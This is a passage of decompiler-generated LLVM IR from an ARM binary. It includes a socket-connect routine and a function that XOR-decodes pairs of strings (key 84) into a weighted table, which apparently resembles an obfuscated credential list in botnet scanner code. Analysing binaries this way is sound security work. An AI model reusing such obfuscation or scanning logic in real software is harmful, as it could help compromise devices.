dec_label_pc_f0b8:                                ; preds = %dec_label_pc_f094
  %v2_f0b8 = inttoptr i32 %v1_efe0 to i8*
  %v3_f0b8 = load i8, i8* %v2_f0b8, align 1
  %v4_f0b8 = zext i8 %v3_f0b8 to i32
  store i32 %v4_f0b8, i32* %r3.global-to-local, align 4
  store i32 %v2_ec98, i32* %r2.global-to-local, align 4
  %v1_f0c4 = add i32 %v2_efcc, 11
  %v2_f0c4 = inttoptr i32 %v1_f0c4 to i8*
  %v3_f0c4 = load i8, i8* %v2_f0c4, align 1
  %v4_f0c4 = zext i8 %v3_f0c4 to i32
  store i32 %v4_f0c4, i32* %r2.global-to-local, align 4
  store i32 %v2_ec98, i32* %r3.global-to-local, align 4
  %v1_f0d0 = add i32 %v2_efcc, 12
  %v2_f0d0 = inttoptr i32 %v1_f0d0 to i8*
  %v3_f0d0 = load i8, i8* %v2_f0d0, align 1
  %v4_f0d0 = zext i8 %v3_f0d0 to i32
  store i32 %v4_f0d0, i32* %r3.global-to-local, align 4
  store i32 %v2_ec98, i32* %ip.global-to-local, align 4
  %v1_f0dc = add i32 %v2_efcc, 13
  %v2_f0dc = inttoptr i32 %v1_f0dc to i8*
  %v3_f0dc = load i8, i8* %v2_f0dc, align 1
  %v4_f0dc = zext i8 %v3_f0dc to i32
  store i32 %v4_f0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ec18, i32* @lr, align 4
  %v2_f0e8 = load i8, i8* %v3_ec18, align 1
  %v3_f0e8 = zext i8 %v2_f0e8 to i32
  %v3_f0ec = mul nuw nsw i32 %v3_f0e8, 4
  %v1_f0f0 = add nuw nsw i32 %v3_f0ec, 4
  store i32 %v1_f0f0, i32* %r1.global-to-local, align 4
  %v3_f0f4 = load i32, i32* %v2_f0f4, align 4
  store i32 %v3_f0f4, i32* %r0.global-to-local, align 4
  %v3_f0f8 = sext i8 %v3_f0dc to i32
  %v5_f0f8 = sext i8 %v3_f0d0 to i32
  %v10_f0f8 = call i32 @function_12814(i32 %v3_f0f4, i32 %v1_f0f0, i32 %v3_f0f8, i32 %v5_f0f8)
  store i32 %v10_f0f8, i32* %r0.global-to-local, align 4
  store i32 %v2_ec18, i32* %r1.global-to-local, align 4
  store i32 %v2_ec98, i32* %ip.global-to-local, align 4
  %v2_f104 = load i8, i8* %v3_ec18, align 1
  %v3_f104 = zext i8 %v2_f104 to i32
  store i32 %v3_f104, i32* %r2.global-to-local, align 4
  %v4_f108 = sext i8 %v3_f0b8 to i32
  store i32 %v4_f108, i32* %r3.global-to-local, align 4
  store i32 %v2_ec18, i32* @lr, align 4
  %v1_f110 = add nuw nsw i32 %v3_f104, 1
  store i32 %v1_f110, i32* %r1.global-to-local, align 4
  %v5_f114 = mul nuw nsw i32 %v3_f104, 4
  %v6_f114 = add i32 %v5_f114, %v10_f0f8
  %v7_f114 = inttoptr i32 %v6_f114 to i32*
  store i32 %v4_f108, i32* %v7_f114, align 4
  %v1_f118 = load i32, i32* @lr, align 4
  %v2_f118 = add i32 %v1_f118, 4
  %v3_f118 = inttoptr i32 %v2_f118 to i32*
  store i32 %v10_f0f8, i32* %v3_f118, align 4
  %v0_f11c = load i32, i32* %r1.global-to-local, align 4
  %v1_f11c = trunc i32 %v0_f11c to i8
  %v2_f11c = load i32, i32* @lr, align 4
  %v3_f11c = inttoptr i32 %v2_f11c to i8*
  store i8 %v1_f11c, i8* %v3_f11c, align 1
  %v0_f120 = load i32, i32* @r4, align 4
  %v1_f120 = add i32 %v0_f120, 9
  %v2_f120 = inttoptr i32 %v1_f120 to i8*
  %v3_f120 = load i8, i8* %v2_f120, align 1
  %v4_f120 = zext i8 %v3_f120 to i32
  store i32 %v4_f120, i32* %r0.global-to-local, align 4
  %v1_f124 = add i32 %v0_f120, 8
  %v2_f124 = inttoptr i32 %v1_f124 to i8*
  %v3_f124 = load i8, i8* %v2_f124, align 1
  %v4_f124 = zext i8 %v3_f124 to i32
  store i32 %v4_f124, i32* %r1.global-to-local, align 4
  %v0_f13c.pre = load i32, i32* @r5, align 4
  %v0_ef64.pre.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f128

dec_label_pc_f128:                                ; preds = %dec_label_pc_f094, %dec_label_pc_f0b8
  %v0_ef64.pre.pre = phi i32 [ %v3_ef70153, %dec_label_pc_f094 ], [ %v0_ef64.pre.pre.pre, %dec_label_pc_f0b8 ]
  %v0_f13c = phi i32 [ %v1_efe0, %dec_label_pc_f094 ], [ %v0_f13c.pre, %dec_label_pc_f0b8 ]
  %v1_f128 = phi i32 [ %v4_f098, %dec_label_pc_f094 ], [ %v4_f120, %dec_label_pc_f0b8 ]
  %v0_f128 = phi i32 [ %v4_f094, %dec_label_pc_f094 ], [ %v4_f124, %dec_label_pc_f0b8 ]
  %v4_f128 = mul nuw nsw i32 %v1_f128, 256
  %v5_f128 = or i32 %v4_f128, %v0_f128
  %v3_f12c = mul i32 %v5_f128, 65536
  store i32 %v3_f12c, i32* %r2.global-to-local, align 4
  %tmp133 = mul nuw nsw i32 %v0_f128, 256
  %v5_f138 = or i32 %tmp133, %v1_f128
  store i32 %v5_f138, i32* %r3.global-to-local, align 4
  %v2_f13c = add i32 %v5_f138, %v0_f13c
  br label %dec_label_pc_ef64.backedge

; uselistorder directives
  uselistorder i32 %v1_f128, { 1, 0 }
  uselistorder i32 %v3_f104, { 1, 0, 2 }
  uselistorder i32 %v10_f0f8, { 1, 0, 2 }
  uselistorder i32 %v4_f098, { 2, 1, 0, 3 }
  uselistorder i32 %v4_f094, { 2, 0, 1, 3 }
  uselistorder i32 %v2_f078, { 1, 0 }
  uselistorder i32 %v3_eff4, { 0, 2, 1 }
  uselistorder i32 %v1_f07864, { 1, 0 }
  uselistorder i32 %v1_f074, { 1, 2, 0 }
  uselistorder i32 %v2_f068, { 1, 0 }
  uselistorder i32 %v3_ef84, { 0, 2, 1 }
  uselistorder i32 %v1_f06849, { 1, 0 }
  uselistorder i32 %v1_f064, { 1, 2, 0 }
  uselistorder i1 %v7_ef6c, { 1, 0 }
  uselistorder i32 %v1_ef64, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v3_f020, { 0, 2, 1 }
  uselistorder i32 %v2_f01c, { 1, 2, 0 }
  uselistorder i32 %v0_f070, { 2, 0, 1 }
  uselistorder i32 %v1_f078, { 1, 2, 0 }
  uselistorder i32 %v3_effc27, { 1, 0 }
  uselistorder i32 %v3_eff425, { 1, 0, 2 }
  uselistorder i32 %v1_efe0, { 2, 3, 1, 0, 5, 4, 6 }
  uselistorder i32 %v2_efcc, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_efb0, { 0, 2, 1 }
  uselistorder i32 %v2_efac, { 1, 2, 0 }
  uselistorder i32 %v0_f060, { 2, 0, 1 }
  uselistorder i32 %v1_f068, { 1, 2, 0 }
  uselistorder i32 %v3_ef8c21, { 1, 0 }
  uselistorder i32 %v3_ef8419, { 1, 0, 2 }
  uselistorder i32 %v0_efcc152, { 3, 0, 1, 2 }
  uselistorder i32 %v3_ef70151, { 1, 0 }
  uselistorder i1 %v7_ef6c150, { 1, 0 }
  uselistorder i32 %v1_ef64143, { 1, 0 }
  uselistorder i32 %v4_ef4c, { 1, 0, 2 }
  uselistorder i32 %v0_eed0, { 1, 0 }
  uselistorder i32 %v0_eea8, { 1, 0 }
  uselistorder i1 %v7_ee64, { 1, 0 }
  uselistorder i32 %v1_ee24, { 1, 0 }
  uselistorder i32 %v3_ee10, { 1, 0 }
  uselistorder i32 %v0_ee08, { 1, 0 }
  uselistorder i32 %v1_edfc, { 1, 2, 0 }
  uselistorder i1 %v7_edc8, { 1, 0 }
  uselistorder i32 %v5_edc4, { 1, 0, 2 }
  uselistorder i1 %v7_edac, { 1, 0 }
  uselistorder i32 %v4_eda8, { 1, 0, 2 }
  uselistorder i1 %v7_ed90, { 1, 0 }
  uselistorder i32 %v3_ed8c, { 2, 1, 0, 3 }
  uselistorder i1 %v7_ed74, { 2, 1, 0 }
  uselistorder i32 %v1_ed78, { 1, 0 }
  uselistorder i32 %v1_ef10, { 1, 2, 0 }
  uselistorder i32 %v2_ee14, { 1, 0, 2 }
  uselistorder i32 %v2_ed70, { 1, 0, 2 }
  uselistorder i32 %v2_ed38, { 4, 3, 2, 5, 7, 9, 1, 0, 6, 8, 10 }
  uselistorder i32 %v4_ecec, { 3, 0, 2, 1 }
  uselistorder i32 %v1_ecb8, { 1, 0, 2 }
  uselistorder i32 %v0_ec74, { 0, 1, 3, 2 }
  uselistorder i32 %v1_ec70, { 1, 0, 2 }
  uselistorder i32 %v1_ec6c, { 1, 0 }
  uselistorder i32 %v2_ec6011, { 1, 0 }
  uselistorder i32 %v2_ec60, { 1, 0 }
  uselistorder i1 %v8_ec50, { 1, 0 }
  uselistorder i32 %v2_ec38, { 0, 2, 1, 3 }
  uselistorder i32 %v0_ec20, { 1, 0 }
  uselistorder i32 %v2_ec18, { 2, 3, 4, 5, 0, 1, 6, 7 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-2240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-64, { 0, 1, 3, 2 }
  uselistorder i8* %stack_var_-4288, { 2, 0, 1 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 15, 10, 13, 11, 12, 14, 16, 33, 17, 18, 19, 20, 21, 25, 22, 23, 24, 26, 34, 35, 27, 28, 29, 30, 31, 32 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 11, 7, 29, 9, 10, 28, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 24, 25, 27 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 11, 6, 7, 27, 9, 10, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 28, 23, 29, 25 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 10, 6, 47, 7, 8, 9, 12, 11, 15, 14, 13, 17, 16, 20, 18, 19, 21, 22, 46, 23, 25, 24, 26, 28, 27, 29, 36, 31, 30, 32, 33, 34, 35, 38, 37, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 9, 3, 14, 4, 5, 15, 6, 7, 8, 34, 10, 11, 12, 13, 33, 35, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 26, 27, 32, 30, 28, 29, 31, 36 }
  uselistorder i32 (i32)* @function_12efc, { 7, 6, 11, 10, 9, 8, 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_f128, { 1, 0 }
  uselistorder label %dec_label_pc_eff4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_ef84.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_ef64.backedge, { 1, 0 }
  uselistorder label %bb130, { 1, 0 }
  uselistorder label %dec_label_pc_f004, { 1, 0 }
  uselistorder label %dec_label_pc_f004.preheader, { 1, 0 }
  uselistorder label %bb128, { 1, 0 }
  uselistorder label %dec_label_pc_ef94, { 1, 0 }
  uselistorder label %dec_label_pc_ef94.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ef78, { 1, 0 }
  uselistorder label %dec_label_pc_eef0, { 1, 0 }
  uselistorder label %dec_label_pc_eed8, { 4, 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_eeb8, { 2, 1, 4, 0, 3 }
  uselistorder label %dec_label_pc_edf8.dec_label_pc_edf8_crit_edge, { 1, 0 }
  uselistorder label %bb126, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ec48, { 1, 0 }
}

define i32 @function_f144() local_unnamed_addr {
dec_label_pc_f144:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f144 = load i32, i32* @r4, align 4
  store i32 %v3_f144, i32* %stack_var_-16, align 4
  %v0_f148 = load i32, i32* @r0, align 4
  store i32 %v0_f148, i32* %r5.global-to-local, align 4
  %v1_f14c = add i32 %v0_f148, 4
  %v2_f14c = inttoptr i32 %v1_f14c to i32*
  %v3_f14c = load i32, i32* %v2_f14c, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 61808, i32* @lr, align 4
  %v1_f16c = icmp ne i32 %v3_f14c, -1
  call void @__pseudo_cond_branch(i1 %v1_f16c, i32 ptrtoint (i32* @global_var_11af0.104 to i32))
  %v3_f17c = call i32 @function_123e0(i32 2, i32 1, i32 0)
  store i32 %v3_f17c, i32* %r3.global-to-local, align 4
  %v7_f184 = icmp eq i32 %v3_f17c, -1
  store i32 256, i32* @r1, align 4
  %v0_f18c = load i32, i32* %r5.global-to-local, align 4
  %v1_f18c = add i32 %v0_f18c, 28
  store i32 %v1_f18c, i32* @r0, align 4
  %v2_f190 = add i32 %v0_f18c, 4
  %v3_f190 = inttoptr i32 %v2_f190 to i32*
  store i32 %v3_f17c, i32* %v3_f190, align 4
  br i1 %v7_f184, label %dec_label_pc_f144.dec_label_pc_f20c_crit_edge, label %dec_label_pc_f198

dec_label_pc_f144.dec_label_pc_f20c_crit_edge:    ; preds = %dec_label_pc_f144
  %v14_f210.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f20c

dec_label_pc_f198:                                ; preds = %dec_label_pc_f144
  %v0_f198 = load i32, i32* %r6.global-to-local, align 4
  %v1_f198 = load i32, i32* %r5.global-to-local, align 4
  %v2_f198 = add i32 %v1_f198, 24
  %v3_f198 = inttoptr i32 %v2_f198 to i32*
  store i32 %v0_f198, i32* %v3_f198, align 4
  %v0_f19c = call i32 @function_1128c()
  %v0_f1a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_f1a0 = add i32 %v0_f1a0, 4
  %v2_f1a0 = inttoptr i32 %v1_f1a0 to i32*
  %v3_f1a0 = load i32, i32* %v2_f1a0, align 4
  store i32 %v3_f1a0, i32* @r4, align 4
  %v0_f1a8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_f1a8, i32* @r2, align 4
  %v2_f1b0 = call i32 @function_11a2c(i32 %v3_f1a0, i32 3)
  %v1_f1b8 = or i32 %v2_f1b0, 2048
  store i32 %v1_f1b8, i32* @r2, align 4
  %v0_f1bc = load i32, i32* @r4, align 4
  %v2_f1c0 = call i32 @function_11a2c(i32 %v0_f1bc, i32 4)
  store i32 ptrtoint (i32* @global_var_1cad4.130 to i32), i32* %r3.global-to-local, align 4
  %v0_f1c8 = load i32, i32* %r5.global-to-local, align 4
  %v1_f1c8 = add i32 %v0_f1c8, 20
  %v2_f1c8 = inttoptr i32 %v1_f1c8 to i32*
  %v3_f1c8 = load i32, i32* %v2_f1c8, align 4
  store i32 %v3_f1c8, i32* @r4, align 4
  %v2_f1cc = load i32, i32* @global_var_1cad4.130, align 4
  %v1_f1d0 = add i32 %v0_f1c8, 16
  %v2_f1d0 = inttoptr i32 %v1_f1d0 to i32*
  %v3_f1d0 = load i32, i32* %v2_f1d0, align 4
  store i32 %v3_f1d0, i32* @lr, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f1d8 = add i32 %v0_f1c8, 8
  %v3_f1d8 = inttoptr i32 %v2_f1d8 to i32*
  store i32 %v2_f1cc, i32* %v3_f1d8, align 4
  %v0_f1dc = load i32, i32* %r3.global-to-local, align 4
  %v1_f1dc = load i32, i32* %r5.global-to-local, align 4
  %v2_f1dc = add i32 %v1_f1dc, 12
  %v3_f1dc = inttoptr i32 %v2_f1dc to i32*
  store i32 %v0_f1dc, i32* %v3_f1dc, align 4
  %v0_f1e4 = load i32, i32* %r5.global-to-local, align 4
  %v1_f1e4 = add i32 %v0_f1e4, 4
  %v2_f1e4 = inttoptr i32 %v1_f1e4 to i32*
  %v3_f1e4 = load i32, i32* %v2_f1e4, align 4
  %v0_f1e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_f1e8 = mul i32 %v0_f1e8, 2
  store i32 %v2_f1e8, i32* %r3.global-to-local, align 4
  store i32 %v2_f1e8, i32* %stack_var_-32, align 4
  %v3_f208 = bitcast i32* %stack_var_-32 to %sockaddr*
  %v4_f208 = call i32 @function_1223c(i32 %v3_f1e4, %sockaddr* %v3_f208, i32 16)
  br label %dec_label_pc_f20c

dec_label_pc_f20c:                                ; preds = %dec_label_pc_f144.dec_label_pc_f20c_crit_edge, %dec_label_pc_f198
  %v14_f210 = phi i32 [ %v14_f210.pre, %dec_label_pc_f144.dec_label_pc_f20c_crit_edge ], [ %v4_f208, %dec_label_pc_f198 ]
  %v2_f210 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f210, i32* @r4, align 4
  ret i32 %v14_f210

; uselistorder directives
  uselistorder i32 %v2_f1e8, { 1, 0 }
  uselistorder i32 %v3_f17c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 ()* @function_1128c, { 8, 4, 7, 6, 5, 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_f20c, { 1, 0 }
}

define i32 @function_f218(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f218:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_f218 = load i32, i32* @r4, align 4
  %v6_f218 = load i32, i32* @r5, align 4
  %v9_f218 = load i32, i32* @r6, align 4
  %v12_f218 = load i32, i32* @r7, align 4
  %v15_f218 = load i32, i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_1caa0.132 to i32), i32* @r8, align 4
  %v2_f220 = load i32, i32* @global_var_1caa0.132, align 4
  store i32 ptrtoint (i32* @global_var_1cacc.134 to i32), i32* %sb.global-to-local, align 4
  %v3_f22c = mul i32 %v2_f220, 16
  store i32 %v3_f22c, i32* %r3.global-to-local, align 4
  %v3_f234 = urem i32 %arg3, 65536
  store i32 %v3_f234, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_f240 = load i32, i32* @global_var_1cacc.134, align 4
  %v1_f244 = add i32 %v3_f22c, 16
  store i32 %v1_f244, i32* %r1.global-to-local, align 4
  store i32 %v3_f234, i32* %stack_var_-44, align 4
  %v8_f24c = call i32 @function_12814(i32 %v2_f240, i32 %v1_f244, i32 %v3_f234, i32 %v3_f22c)
  store i32 %v8_f24c, i32* %sl.global-to-local, align 4
  %v0_f254 = load i32, i32* @r5, align 4
  %v1_f258 = load i32, i32* %sb.global-to-local, align 4
  %v2_f258 = inttoptr i32 %v1_f258 to i32*
  store i32 %v8_f24c, i32* %v2_f258, align 4
  %v2_f25c = load i32, i32* @global_var_1caa0.132, align 4
  store i32 %v2_f25c, i32* %fp.global-to-local, align 4
  %v1_f260 = inttoptr i32 %v0_f254 to i8*
  %v2_f260 = call i32 @function_111ec(i8* %v1_f260)
  %sext = mul i32 %v2_f260, 16777216
  %v1_f264 = sdiv i32 %sext, 16777216
  %v2_f264 = add nsw i32 %v1_f264, 1
  store i32 %v2_f264, i32* @r4, align 4
  store i32 %v1_f264, i32* @r7, align 4
  %v1_f270 = call i32 @function_12578(i32 %v2_f264)
  %v0_f274 = load i32, i32* @r5, align 4
  store i32 %v0_f274, i32* %r1.global-to-local, align 4
  %v0_f278 = load i32, i32* @r4, align 4
  store i32 %v0_f278, i32* %r2.global-to-local, align 4
  store i32 %v1_f270, i32* @r6, align 4
  %v3_f280 = call i32 @function_11268(i32 %v1_f270, i32 %v0_f274, i32 %v0_f278)
  %v0_f284 = load i32, i32* @r7, align 4
  %tmp21 = icmp slt i32 %v0_f284, 1
  %extract.t6 = trunc i32 %v0_f284 to i8
  br i1 %tmp21, label %dec_label_pc_f2a8, label %dec_label_pc_f28c

dec_label_pc_f28c:                                ; preds = %dec_label_pc_f218
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %dec_label_pc_f290, %dec_label_pc_f28c
  %v2_f298 = phi i32 [ %v1_f29c, %dec_label_pc_f290 ], [ 0, %dec_label_pc_f28c ]
  %v1_f290 = load i32, i32* @r6, align 4
  %v2_f290 = add i32 %v1_f290, %v2_f298
  %v3_f290 = inttoptr i32 %v2_f290 to i8*
  %v4_f290 = load i8, i8* %v3_f290, align 1
  %v6_f290 = zext i8 %v4_f290 to i32
  %v1_f294 = xor i32 %v6_f290, 84
  store i32 %v1_f294, i32* %r3.global-to-local, align 4
  %v1_f298 = trunc i32 %v1_f294 to i8
  store i8 %v1_f298, i8* %v3_f290, align 1
  %v0_f29c = load i32, i32* %r2.global-to-local, align 4
  %v1_f29c = add i32 %v0_f29c, 1
  store i32 %v1_f29c, i32* %r2.global-to-local, align 4
  %v0_f2a0 = load i32, i32* @r7, align 4
  %v9_f2a0 = icmp eq i32 %v0_f2a0, %v1_f29c
  br i1 %v9_f2a0, label %dec_label_pc_f2a8.loopexit, label %dec_label_pc_f290

dec_label_pc_f2a8.loopexit:                       ; preds = %dec_label_pc_f290
  %extract.t = trunc i32 %v1_f29c to i8
  br label %dec_label_pc_f2a8

dec_label_pc_f2a8:                                ; preds = %dec_label_pc_f2a8.loopexit, %dec_label_pc_f218
  %v0_f2b8.off0 = phi i8 [ %extract.t, %dec_label_pc_f2a8.loopexit ], [ %extract.t6, %dec_label_pc_f218 ]
  %v2_f2a8 = load i32, i32* @global_var_1caa0.132, align 4
  %v2_f2ac = load i32, i32* @global_var_1cacc.134, align 4
  store i32 %v2_f2ac, i32* %r2.global-to-local, align 4
  %v3_f2b0 = mul i32 %v2_f2a8, 16
  %v2_f2b4 = add i32 %v2_f2ac, %v3_f2b0
  store i32 %v2_f2b4, i32* %r3.global-to-local, align 4
  %v3_f2b8 = add i32 %v2_f2b4, 12
  %v4_f2b8 = inttoptr i32 %v3_f2b8 to i8*
  store i8 %v0_f2b8.off0, i8* %v4_f2b8, align 1
  %v0_f2bc = load i32, i32* @r6, align 4
  %v1_f2bc = load i32, i32* %sl.global-to-local, align 4
  %v2_f2bc = load i32, i32* %fp.global-to-local, align 4
  %v5_f2bc = mul i32 %v2_f2bc, 16
  %v6_f2bc = add i32 %v5_f2bc, %v1_f2bc
  %v7_f2bc = inttoptr i32 %v6_f2bc to i32*
  store i32 %v0_f2bc, i32* %v7_f2bc, align 4
  %v2_f2c4 = load i32, i32* @global_var_1caa0.132, align 4
  store i32 %v2_f2c4, i32* @r7, align 4
  %v2_f2c8 = load i32, i32* @global_var_1cacc.134, align 4
  store i32 %v2_f2c8, i32* %sl.global-to-local, align 4
  %v1_f2cc = inttoptr i32 %arg2 to i8*
  %v2_f2cc = call i32 @function_111ec(i8* %v1_f2cc)
  %sext1 = mul i32 %v2_f2cc, 16777216
  %v1_f2d0 = sdiv i32 %sext1, 16777216
  %v2_f2d0 = add nsw i32 %v1_f2d0, 1
  store i32 %v2_f2d0, i32* @r4, align 4
  store i32 %v1_f2d0, i32* @r5, align 4
  %v1_f2dc = call i32 @function_12578(i32 %v2_f2d0)
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_f2e4 = load i32, i32* @r4, align 4
  store i32 %v0_f2e4, i32* %r2.global-to-local, align 4
  store i32 %v1_f2dc, i32* %r6.global-to-local, align 4
  %v3_f2ec = call i32 @function_11268(i32 %v1_f2dc, i32 %arg2, i32 %v0_f2e4)
  %v0_f2f0 = load i32, i32* @r5, align 4
  %tmp22 = icmp slt i32 %v0_f2f0, 1
  %extract.t8 = trunc i32 %v0_f2f0 to i8
  br i1 %tmp22, label %dec_label_pc_f314, label %dec_label_pc_f2f8

dec_label_pc_f2f8:                                ; preds = %dec_label_pc_f2a8
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f2fc

dec_label_pc_f2fc:                                ; preds = %dec_label_pc_f2fc, %dec_label_pc_f2f8
  %v2_f304 = phi i32 [ %v1_f308, %dec_label_pc_f2fc ], [ 0, %dec_label_pc_f2f8 ]
  %v1_f2fc = load i32, i32* %r6.global-to-local, align 4
  %v2_f2fc = add i32 %v1_f2fc, %v2_f304
  %v3_f2fc = inttoptr i32 %v2_f2fc to i8*
  %v4_f2fc = load i8, i8* %v3_f2fc, align 1
  %v6_f2fc = zext i8 %v4_f2fc to i32
  %v1_f300 = xor i32 %v6_f2fc, 84
  store i32 %v1_f300, i32* %r3.global-to-local, align 4
  %v1_f304 = trunc i32 %v1_f300 to i8
  store i8 %v1_f304, i8* %v3_f2fc, align 1
  %v0_f308 = load i32, i32* %r2.global-to-local, align 4
  %v1_f308 = add i32 %v0_f308, 1
  store i32 %v1_f308, i32* %r2.global-to-local, align 4
  %v0_f30c = load i32, i32* @r5, align 4
  %v9_f30c = icmp eq i32 %v0_f30c, %v1_f308
  br i1 %v9_f30c, label %dec_label_pc_f314.loopexit, label %dec_label_pc_f2fc

dec_label_pc_f314.loopexit:                       ; preds = %dec_label_pc_f2fc
  %extract.t7 = trunc i32 %v1_f308 to i8
  br label %dec_label_pc_f314

dec_label_pc_f314:                                ; preds = %dec_label_pc_f314.loopexit, %dec_label_pc_f2a8
  %v0_f324.off0 = phi i8 [ %extract.t7, %dec_label_pc_f314.loopexit ], [ %extract.t8, %dec_label_pc_f2a8 ]
  %v2_f314 = load i32, i32* @global_var_1caa0.132, align 4
  %v2_f318 = load i32, i32* @global_var_1cacc.134, align 4
  %v3_f31c = mul i32 %v2_f314, 16
  %v2_f320 = or i32 %v3_f31c, 13
  %v3_f324 = add i32 %v2_f320, %v2_f318
  %v4_f324 = inttoptr i32 %v3_f324 to i8*
  store i8 %v0_f324.off0, i8* %v4_f324, align 1
  %v2_f32c = load i32, i32* @global_var_1caa0.132, align 4
  store i32 %v2_f32c, i32* %lr.global-to-local, align 4
  %v4_f330 = load i8, i8* @global_var_1cad1.137, align 1
  %v5_f330 = zext i8 %v4_f330 to i32
  %v3_f334 = load i8, i8* bitcast (i8** @global_var_1cad0.136 to i8*), align 4
  %v4_f334 = zext i8 %v3_f334 to i32
  %v2_f338 = load i32, i32* @global_var_1cacc.134, align 4
  %v4_f33c = mul nuw nsw i32 %v5_f330, 256
  %v5_f33c = or i32 %v4_f334, %v4_f33c
  store i32 %v5_f33c, i32* %r2.global-to-local, align 4
  %v3_f340 = mul i32 %v2_f32c, 16
  %v2_f344 = add i32 %v2_f338, %v3_f340
  store i32 %v2_f344, i32* %r1.global-to-local, align 4
  %v3_f34c = add i32 %v2_f344, 9
  %v4_f34c = inttoptr i32 %v3_f34c to i8*
  store i8 %v4_f330, i8* %v4_f34c, align 1
  %v0_f350 = load i32, i32* %r2.global-to-local, align 4
  %v1_f350 = trunc i32 %v0_f350 to i8
  %v2_f350 = load i32, i32* %r1.global-to-local, align 4
  %v3_f350 = add i32 %v2_f350, 8
  %v4_f350 = inttoptr i32 %v3_f350 to i8*
  store i8 %v1_f350, i8* %v4_f350, align 1
  %v4_f354 = load i8, i8* @global_var_1cad1.137, align 1
  %v5_f354 = zext i8 %v4_f354 to i32
  %v3_f358 = load i8, i8* bitcast (i8** @global_var_1cad0.136 to i8*), align 4
  %v4_f358 = zext i8 %v3_f358 to i32
  %v4_f35c = mul nuw nsw i32 %v5_f354, 256
  %v5_f35c = or i32 %v4_f358, %v4_f35c
  %v2_f360 = load i32, i32* %stack_var_-44, align 4
  %v2_f364 = add i32 %v5_f35c, %v2_f360
  store i32 %v2_f364, i32* %r3.global-to-local, align 4
  %v3_f3689 = udiv i32 %v2_f364, 256
  %v1_f36c = trunc i32 %v3_f3689 to i8
  %v2_f36c = load i32, i32* %r1.global-to-local, align 4
  %v3_f36c = add i32 %v2_f36c, 11
  %v4_f36c = inttoptr i32 %v3_f36c to i8*
  store i8 %v1_f36c, i8* %v4_f36c, align 1
  %v0_f370 = load i32, i32* %r3.global-to-local, align 4
  %v1_f370 = trunc i32 %v0_f370 to i8
  %v2_f370 = load i32, i32* %r1.global-to-local, align 4
  %v3_f370 = add i32 %v2_f370, 10
  %v4_f370 = inttoptr i32 %v3_f370 to i8*
  store i8 %v1_f370, i8* %v4_f370, align 1
  %v4_f374 = load i8, i8* @global_var_1cad1.137, align 1
  %v5_f374 = zext i8 %v4_f374 to i32
  %v3_f378 = load i8, i8* bitcast (i8** @global_var_1cad0.136 to i8*), align 4
  %v4_f378 = zext i8 %v3_f378 to i32
  %v4_f37c = mul nuw nsw i32 %v5_f374, 256
  %v5_f37c = or i32 %v4_f378, %v4_f37c
  %v2_f380 = load i32, i32* %stack_var_-44, align 4
  %v2_f384 = add i32 %v5_f37c, %v2_f380
  store i32 %v2_f384, i32* %r2.global-to-local, align 4
  %v0_f388 = load i32, i32* @r7, align 4
  %v3_f388 = mul i32 %v0_f388, 16
  %v1_f38c = load i32, i32* %sl.global-to-local, align 4
